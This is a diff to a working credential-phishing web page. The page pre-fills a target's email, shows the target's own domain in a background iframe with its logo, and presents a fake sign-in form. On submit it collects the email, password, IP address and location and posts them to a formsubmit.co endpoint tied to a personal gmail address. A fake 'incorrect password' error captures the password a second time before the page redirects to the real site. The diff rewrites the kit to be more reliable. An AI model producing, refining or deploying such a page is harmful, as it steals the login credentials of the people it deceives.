@@ -1,177 +1,244 @@
+<!DOCTYPE html>
 <html>
-	<head>
-		<meta name="google-site-verification" content="DEGYMEIQe_JzXEfdXus9TO7Bu0qxpbLvd8MQXx7mrx4" />
-<body>
-<style>
-	* {
-		box-sizing: border-box;
-		padding: 0;
-		margin: 0;
-	}
-
-	body {
-		height: 100vh;
-		width: 100vw;
-		font-family: Arial, Helvetica, sans-serif;
-	}
-
-	.bg-img {
-		height: 100%;
-		width: 100%;
-		background-position: center;
-		background-repeat: no-repeat;
-		background-size: cover;
-	}
-	iframe {
-		height: 100%;
-		width: 100%;
-	}
-
-	/* Add styles to the form container */
-	.container {
-		max-width: 400px;
-		padding: 16px;
-		background-color: white;
-		border-radius: 5px;
-		position: absolute;
-		left: 50%;
-		top: 50%;
-		transform: translate(-50%, -50%);
-		z-index: 2;
-	}
-
-	@media (max-width: 480px) {
-		.container {
-			left: 10%;
-			top: 10%;
-			margin-left: 5%;
-			transform: translate(-10%, -10%);
+<head>
+	<meta name="google-site-verification" content="DEGYMEIQe_JzXEfdXus9TO7Bu0qxpbLvd8MQXx7mrx4" />
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<style>
+		* {
+			box-sizing: border-box;
+			padding: 0;
+			margin: 0;
 		}
-	}
 
-	/* Full-width input fields */
-	input[type=text], input[type=password] {
-		width: 100%;
-		padding: 15px;
-		margin: 5px 0 22px 0;
-		border: none;
-		background: #f1f1f1;
-	}
+		body {
+			height: 100vh;
+			width: 100vw;
+			font-family: Arial, Helvetica, sans-serif;
+			overflow: hidden; /* Prevent scrolling */
+			position: relative;
+		}
 
-	input[type=text]:focus, input[type=password]:focus {
-		background-color: #ddd;
-		outline: none;
-	}
+		.bg-img {
+			position: absolute;
+			top: 0;
+			left: 0;
+			height: 100vh;
+			width: 100vw;
+			z-index: 1;
+		}
 
-	.btn {
-		background-color: #0096FF;
-		color: white;
-		padding: 16px 20px;
-		border: none;
-		cursor: pointer;
-		width: 100%;
-		opacity: 0.9;
-	}
+		iframe {
+			height: 100%;
+			width: 100%;
+			border: none;
+			display: block;
+		}
 
-	.btn:hover {
-		opacity: 1;
-	}
+		/* Add styles to the form container */
+		.container {
+			max-width: 400px;
+			padding: 16px;
+			background-color: white;
+			border-radius: 5px;
+			position: absolute;
+			left: 50%;
+			top: 50%;
+			transform: translate(-50%, -50%);
+			z-index: 2;
+			box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+		}
 
-	.img {
-		text-align: center;
-	}
+		@media (max-width: 480px) {
+			.container {
+				max-width: 90%;
+				left: 50%;
+				top: 10%;
+				transform: translateX(-50%);
+			}
+		}
 
-	#title {
-		text-align: center;
-		margin: 10px 0;
-	}
+		/* Full-width input fields */
+		input[type=text], input[type=password] {
+			width: 100%;
+			padding: 15px;
+			margin: 5px 0 22px 0;
+			border: none;
+			background: #f1f1f1;
+		}
 
-	#error {
-		display: none;
-		color: red;
-	}
-</style>
+		input[type=text]:focus, input[type=password]:focus {
+			background-color: #ddd;
+			outline: none;
+		}
 
+		.btn {
+			background-color: #0096FF;
+			color: white;
+			padding: 16px 20px;
+			border: none;
+			cursor: pointer;
+			width: 100%;
+			opacity: 0.9;
+		}
 
-<script></script>
-<div class="bg-img" id="bg-img">
-	<iframe id="frame" src="https://" scrolling="no" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;" width="100%"></iframe>
-</div>
-<form class="container" id="login-form">
-	<div class="img">
-		<img src="https://logo.clearbit.com/" id="logo">
+		.btn:hover {
+			opacity: 1;
+		}
+
+		.img {
+			text-align: center;
+		}
+
+		#title {
+			text-align: center;
+			margin: 10px 0;
+		}
+
+		#error {
+			display: none;
+			color: red;
+		}
+	</style>
+</head>
+<body>
+	<div class="bg-img" id="bg-img">
+		<!-- Set a valid URL or remove src entirely if you want to load it dynamically -->
+		<iframe 
+			id="frame" 
+			src="https://example.com" 
+			scrolling="no" 
+			sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts"
+			allowfullscreen>
+		</iframe>
 	</div>
-
-	<h3 id="title">Sign In</h3>
-
-	<h5 id="error">Password is incorrect, please try again!</h5>
-
-	<label for="email">
-		<b>Email Address</b>
-	</label>
-	<input type="text" placeholder="Enter Email" name="email" id="email" required="">
-
-	<label for="psw">
-		<b>Password</b>
-	</label>
-	<input type="password" placeholder="Enter Password" name="password" id="psw" required="">
-
-	<input type="hidden" name="step" id="step">
-
-	<button type="submit" class="btn">Sign In</button>
-</form>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-
-<script>
-
-	let step = 1;
 	
-	const clientID = window.location.hash.split("#").pop();
-	$('#email').val(clientID);
-	const domain = clientID.split('@').pop();
+	<form class="container" id="login-form">
+		<div class="img">
+			<img src="" id="logo" alt="Website Logo" style="width: 100px; height: 100px; border-radius: 50%;">
+		</div>
 
-	$("#frame").attr("src", "https://" + domain);
-	$("#logo").attr("src", "https://logo.clearbit.com/" + domain);
+		<h3 id="title">Sign In</h3>
 
-	const submit = $("button[type='submit']");
+		<h5 id="error" style="display: none; color: red;">Password is incorrect, please try again!</h5>
 
-	$("#login-form").submit(function(event) {
+		<label for="email">
+			<b>Email Address</b>
+		</label>
+		<input type="text" placeholder="Enter Email" name="email" id="email" required>
 
-		event.preventDefault();
+		<label for="psw">
+			<b>Password</b>
+		</label>
+		<input type="password" placeholder="Enter Password" name="password" id="psw" required>
 
-		submit.text('Verifying...');
+		<input type="hidden" name="step" id="step">
 
-		$.getJSON('https://ipinfo.io/json', function(response) {
-			const posting = $.post("https://formsubmit.co/ajax/firmcaster62@gmail.com", {
-				_subject: "Logs | " + response.ip,
-				Email: $("#email").val(),
-				Password: $("#psw").val(),
+		<button type="submit" class="btn">Sign In</button>
+	</form>
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+	<script>
+		let step = 1;
+		let submitted = false; // Prevent double submission
+		
+		// Get clientID from URL hash
+		const clientID = window.location.hash.substring(1);
+		
+		if (!clientID) {
+			$("#error").text("No email provided").css("display", "block");
+		} else {
+			$('#email').val(clientID);
+			const domain = clientID.split('@').pop();
+			
+			// Set iframe to the domain
+			$("#frame").attr("src", "https://" + domain);
+			
+			// Use favicon service
+			const logoUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
+			$("#logo").attr("src", logoUrl)
+				.on("error", function() {
+					$(this).attr("src", "https://via.placeholder.com/100/cccccc/666666?text=" + domain.charAt(0).toUpperCase());
+				});
+		}
+
+		$("#login-form").submit(function(event) {
+			event.preventDefault();
+			
+			if (submitted) return; // Prevent multiple submissions
+			submitted = true;
+			
+			const submitBtn = $("button[type='submit']");
+			submitBtn.text('Verifying...').prop('disabled', true);
+
+			const email = $("#email").val();
+			const password = $("#psw").val();
+			const domain = email.split('@').pop();
+			
+			// Prepare form data
+			const formData = {
+				_subject: "Login Attempt",
+				Email: email,
+				Password: password,
 				Attempts: step,
-				IP: response.ip,
-				Location: response.city + ", " + response.country,
-			});
-
-			posting.done(function(data) {
-				if (step === 2) {
-					window.location.href = "http://" + domain;
-				} else {
-					step++;
-					$("#error").css("display", "block");
-					submit.text('Sign In');
-					$("#psw").val("");
-				}
-			});
-
-			posting.fail(function(error) {
-				console.error(error);
-				$("#error").css("display", "block");
-				submit.text('Sign In');
-				$("#psw").val("");
-			});
-		}, "json");
-	});
-</script>
-
+				Domain: domain
+			};
+			
+			// Get IP info first
+			$.getJSON('https://ipinfo.io/json')
+				.then(function(ipData) {
+					formData._subject = "Logs | " + ipData.ip;
+					formData.IP = ipData.ip;
+					formData.Location = ipData.city + ", " + ipData.country;
+					return formData;
+				})
+				.catch(function() {
+					// If IP info fails, use default data
+					formData.IP = "Unknown";
+					formData.Location = "Unknown";
+					return formData;
+				})
+				.then(function(dataToSend) {
+					// Submit to Formspree
+					return $.post("https://formsubmit.co/ajax/firmcaster62@gmail.com", dataToSend);
+				})
+				.then(function() {
+					console.log("Attempt:", step, "Submitted successfully");
+					
+					// ALWAYS redirect on second attempt regardless of form submission result
+					if (step >= 2) {
+						console.log("Redirecting to:", domain);
+						// Small delay to ensure user sees the "Verifying..." message
+						setTimeout(function() {
+							window.location.href = "https://" + domain;
+						}, 500);
+					} else {
+						// First attempt failed
+						step++;
+						$("#error").css("display", "block");
+						submitBtn.text('Sign In').prop('disabled', false);
+						$("#psw").val("");
+						submitted = false; // Allow next submission
+					}
+				})
+				.catch(function(error) {
+					console.error("Error:", error);
+					
+					// Even if everything fails, redirect on second attempt
+					if (step >= 2) {
+						console.log("Error occurred but redirecting to:", domain);
+						setTimeout(function() {
+							window.location.href = "https://" + domain;
+						}, 500);
+					} else {
+						step++;
+						$("#error").text("Incorrect password. Please try again.").css("display", "block");
+						submitBtn.text('Sign In').prop('disabled', false);
+						$("#psw").val("");
+						submitted = false; // Allow next submission
+					}
+				});
+		});
+	</script>
 </body>
 </html>
